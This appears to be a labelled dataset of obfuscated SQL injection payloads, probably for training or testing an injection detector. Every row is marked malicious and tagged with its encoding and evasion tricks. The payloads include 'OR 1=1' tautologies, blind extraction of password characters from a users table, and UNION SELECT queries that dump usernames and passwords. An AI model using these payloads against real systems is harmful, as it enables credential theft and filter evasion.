"username=admin'%2F%2Afoo%2A/AND%2F%2Abar*%2FSUBSTRING((SELECT+password+from+users),1,1)%3D%27a'#%23",1,sqli_mixed,case_var|comment_url_hash,partially_encoded,SQLI_MIXED_002,c37526d298901e7011df79d1876c6b6f,51c26341c278721d11853e828adc37dd,99
username%3Dadmin%27%2F%2Afoo%2A%2FAND%2F%2Abar%2A%2FSUBSTRING%28%28SELECT%09password%09FROM%09users%29%2C1%2C1%29%3D%27a%27%23,1,sqli_mixed,ws_tab,url_encoded,SQLI_MIXED_002,3edbf6815e9185ad50b02db7c8ad8069,3c24c2a7960d64dff0ed9ca1cbce2bc4,126
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT/**/password/**/from/**/users),1,1)='a'#/*",1,sqli_mixed,case_var|comment_block_comment|ws_mixed_ws,raw,SQLI_MIXED_002,7b83ac6eb6d4053857a3c7eb8476531b,1adc51efadbdc62ff80f5ff171578db7,91
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%252520from%252520users--,1,sqli_mixed,case_var|ws_url_space,double_encoded,SQLI_MIXED_003,9467e1d40b9756a553fb2807c15bcde2,ae213d10f4818dd0f6c250249bdf6d38,158
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%252BFROM%252Busers--,1,sqli_mixed,ws_mixed_ws,double_encoded,SQLI_MIXED_003,db6503e18d2a53a5b35402860849ceb0,9678b9c9de4b91b3a0ea2e6562990f0f,154
id%3D1%2527%252F%252A%252A%252F%256f%2552%2520%2531%253d%2531%2523--+-,1,sqli_mixed,case_var|comment_dash_dash_space,url_encoded,SQLI_MIXED_001,1710027da9abaea87be5ac1988375732,76276c06f3fc76cd9f1ebc852801f1b1,70
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%2B%2BFROM%2B%2Busers--%253B--%2B%2B-,1,sqli_mixed,comment_semicolon_comment|ws_multi_space,double_encoded,SQLI_MIXED_003,5bfcd1ae166ebed63c43cbf14f455d79,5f47821bd4a1d1f7577f54068e02ed54,170
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29%2F%2A%2A%2Ffrom%2F%2A%2A%2Fusers--,1,sqli_mixed,case_var|ws_comment_ws,url_encoded,SQLI_MIXED_003,eb8fdabf88abf8bb4485369f5d7109ac,ca8402132ab2b665c1b58e8156b2fd6c,134
"id%3D-1%27%2F*!50000UNION*%2F%2F*!50000SELECT*%2F1,CONCAT(user,0x3a,password)++from++users--",1,sqli_mixed,case_var|ws_multi_space,partially_encoded,SQLI_MIXED_003,f36617c8f12c8f713ed10bce62c2037d,40618ec9a1090b4e553948d1afff8837,92
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT/**/password/**/FROM/**/users),1,1)='a'#--",1,sqli_mixed,comment_dash_dash|ws_comment_ws,raw,SQLI_MIXED_002,ac3ac9767302533080d58d026faba2f1,1db7524ab75ab423800e6291484f66c4,91
"username%3Dadmin'/%2Afoo%2A/AND%2F*bar%2A%2FSUBSTRING((SELECT	password	from	users),1,1)=%27a'%23",1,sqli_mixed,case_var|ws_tab,partially_encoded,SQLI_MIXED_002,6782230258e6999308a31ee4be868bb7,18bbbd86bf3b9dfd87444efea486414c,96
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT   password   FROM   users),1,1)='a'#/*",1,sqli_mixed,comment_block_comment|ws_mixed_ws,raw,SQLI_MIXED_002,0cd346f7370b5055e75317c84c6c5e7a,384ef711ef907447fdbc710b4fcda125,88
id%3D1%2527%252F%252A%252A%252F%256f%2552%2520%2531%253d%2531%2523%23,1,sqli_mixed,comment_hash|ws_tab,url_encoded,SQLI_MIXED_001,4faebd16f932ed954fc15de767e67da1,0075b508ced80fe837e8ec3d1134f02d,69
username%3Dadmin%27%2F%2Afoo%2A%2FAND%2F%2Abar%2A%2FSUBSTRING%28%28SELECT+password+FROM+users%29%2C1%2C1%29%3D%27a%27%23%2523,1,sqli_mixed,case_var|comment_url_hash|ws_space,url_encoded,SQLI_MIXED_002,bda702b902c4a561d23ac584593796df,d7cabba02387725250f9ad2440c9702d,125
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29+FROM+users--%23,1,sqli_mixed,comment_hash|ws_space,url_encoded,SQLI_MIXED_003,ccc067a25f0bbd8e539899cf5725f7b2,9bcec5dece15bcbb344a83207b6a299f,115
"username%3Dadmin%27/%2Afoo*/AND/*bar%2A%2FSUBSTRING((SELECT+password+From+users),1,1)%3D%27a'%23%23",1,sqli_mixed,case_var|comment_url_hash|ws_plus,partially_encoded,SQLI_MIXED_002,c06c832366c27d656238afde1042be4e,fddc17bd308ae16450752bb3ba220db4,99
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers----%2F%2A%2A%2F-,1,sqli_mixed,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_MIXED_003,460a6846d06ec314d3ae6844f842fa58,13252942ea4febf5e354a9c546b83ef4,149
id%3D1%2527%252F%252A%252A%252F%256f%2552%2520%2531%253d%2531%2523%3B--%2F%2A%2A%2F-,1,sqli_mixed,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_MIXED_001,4f286e1b695012f114ef1315743238bc,c0f63f8e5930d8b8766a4cdcc79c19f3,84
id%3D1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23%2F*,1,sqli_mixed,comment_block_comment|ws_url_space,partially_encoded,SQLI_MIXED_001,3a3d56e449504a891e0b079b391aa01d,741d3871f0e4114b7b3dcc01a07d01e0,46
"id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password)/**/from/**/users--",1,sqli_mixed,case_var|ws_comment_ws,raw,SQLI_MIXED_003,6ba96c3826ee8fd24a56971ff4a56054,7ca582d829b41057db85ce533ef3fa7a,84
"username%3Dadmin%27%2F*foo%2A/AND/*bar%2A/SUBSTRING((SELECT password FROM users),1,1)=%27a%27%23",1,sqli_mixed,standard,partially_encoded,SQLI_MIXED_002,ccc74d92b29c7cfee2a5afc28880c377,c8fab245f1e447686ab5f4d1c997c29b,96
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29++FROM++users--%2F%2A,1,sqli_mixed,comment_block_comment|ws_multi_space,url_encoded,SQLI_MIXED_003,63d7b1bc3e5d3f44b9991570dc1ac79e,db026d25ba3d68e33754ba6f98331e16,120
id%253D1%252527%25252F%25252A%25252A%25252F%25256f%252552%252520%252531%25253d%252531%252523--%252520-,1,sqli_mixed,comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_MIXED_001,1ff3fb85e4ff061776c23a2d5a32dbc7,110f3008f18571d156bd1fc341ef4d3c,102
username%253Dadmin%2527%252F%252Afoo%252A%252FAND%252F%252Abar%252A%252FSUBSTRING%2528%2528SELECT%2Bpassword%2BFrom%2Busers%2529%252C1%252C1%2529%253D%2527a%2527%2523--%2B-,1,sqli_mixed,case_var|comment_dash_dash_space,double_encoded,SQLI_MIXED_002,a98e963bb291b880ec3b8d92c83031db,429f268c636923b9dc40da5b79de93d0,172
username%3Dadmin%27%2F%2Afoo%2A%2FAND%2F%2Abar%2A%2FSUBSTRING%28%28SELECT%2Bpassword%2BFROM%2Busers%29%2C1%2C1%29%3D%27a%27%23,1,sqli_mixed,ws_plus,url_encoded,SQLI_MIXED_002,d582350c89b47aaa643e36bb9d6af594,9c96ac86730d8638aadab7e96a4eacca,126
"username=admin%27%2F%2Afoo*%2FAND%2F*bar*%2FSUBSTRING((SELECT/*%2A%2Fpassword/%2A%2A%2FFROM/**/users),1,1)%3D%27a%27#",1,sqli_mixed,case_var|comment_hash|ws_comment_ws,partially_encoded,SQLI_MIXED_002,9faf00d13a74dc3808cee1babbe5ef61,f5a9814dbc67eaf61321bf8f4473e8eb,117
"id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password)  FROM  users--%23",1,sqli_mixed,comment_url_hash|ws_multi_space,raw,SQLI_MIXED_003,9dd40c8a5adffe5d487e084e6a8dfa4c,8e2121fe741080a216ad2300d7049fe8,83
"id=-1%27%2F%2A!50000UNION%2A%2F%2F%2A!50000SELECT%2A%2F1,CONCAT(user,0x3a,password)+FRom users--",1,sqli_mixed,case_var,partially_encoded,SQLI_MIXED_003,fcb8ebdf39f3d1aa654709669d854195,c1194cc9aa738f314285b2078fdc3560,96
"username%3Dadmin'%2F*foo*%2FAND%2F*bar*%2FSUBSTRING((SELECT+password+From users),1,1)%3D%27a%27%23",1,sqli_mixed,case_var,partially_encoded,SQLI_MIXED_002,52511c9c8bc8e474b7eb22bd1bd3f645,a14d9f5e0bd3d321ece4a0d8ae2a8b90,98
id%3D1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23%23,1,sqli_mixed,comment_hash|ws_url_space,partially_encoded,SQLI_MIXED_001,274bb601f3c7d815bbee39d313f0d1e2,56a5efa3d2bf86909dbf96d080574f18,45
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%2Bfrom%2Busers--%253B--%2B-,1,sqli_mixed,case_var|comment_semicolon_comment,double_encoded,SQLI_MIXED_003,203214c398fe5cead3431668bc7c7e41,927814cf8babfad8cd688e09c430dc6a,161
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29%2Bfrom%2Busers--%23,1,sqli_mixed,case_var|comment_hash|ws_mixed_ws,url_encoded,SQLI_MIXED_003,87b665f1f549a9effaf770a8372c86de,eb444171ff75a1f0611b691436caf8b1,119
username%3Dadmin%27%2F%2Afoo%2A%2FAND%2F%2Abar%2A%2FSUBSTRING%28%28SELECT++password++from++users%29%2C1%2C1%29%3D%27a%27%23,1,sqli_mixed,case_var|ws_multi_space,url_encoded,SQLI_MIXED_002,aef8ef97539d6d930a2feedf42a3acd2,cfcf342adf0773a02fb971975b912707,123
username%253Dadmin%2527%252F%252Afoo%252A%252FAND%252F%252Abar%252A%252FSUBSTRING%2528%2528SELECT%252F%252A%252A%252Fpassword%252F%252A%252A%252FFrom%252F%252A%252A%252Fusers%2529%252C1%252C1%2529%253D%2527a%2527%2523%252523,1,sqli_mixed,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_MIXED_002,bd8dbb95071b62710205bef700886907,2dfa90cff088b85dcade8f393a0a7a9b,224
"id=-1'%2F%2A!50000UNION%2A%2F%2F*!50000SELECT%2A%2F1,CONCAT(user,0x3a,password)+FROM+users--/*",1,sqli_mixed,case_var|comment_block_comment,partially_encoded,SQLI_MIXED_003,870067c22817038aea4d0ab219eb0c53,34ed586a7cb74a53c53a311892d737ed,94
id%3D1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23;--	-,1,sqli_mixed,comment_semicolon_comment|ws_tab,partially_encoded,SQLI_MIXED_001,aa810541cc046c84837a1a74af799ccb,d94c5ca51acc58a09c632fece97f675d,47
"username=admin%27%2F*foo%2A%2FAND/%2Abar%2A%2FSUBSTRING((SELECT%20password%20FROM%20users),1,1)=%27a'#",1,sqli_mixed,case_var|ws_url_space,partially_encoded,SQLI_MIXED_002,7777162213d72e76f1a8f8c523be7097,2782875c99e549cf2748e662ef19a2e4,102
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29%2520FROM%2520users--%3B--%2520-,1,sqli_mixed,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_MIXED_003,8986d878dd00883d87527c7cd95da8ac,9097f9e0d7febb27d6e9e3b017a1aaa3,131
"username=admin'%2F%2Afoo%2A%2FAND/%2Abar%2A/SUBSTRING((SELECT+password+from+users),1,1)%3D'a'%23",1,sqli_mixed,case_var|ws_plus,partially_encoded,SQLI_MIXED_002,7ead1920dccf99ddfef8dc087d20267c,ec72b8cea2877c60423d13a1945911e7,96
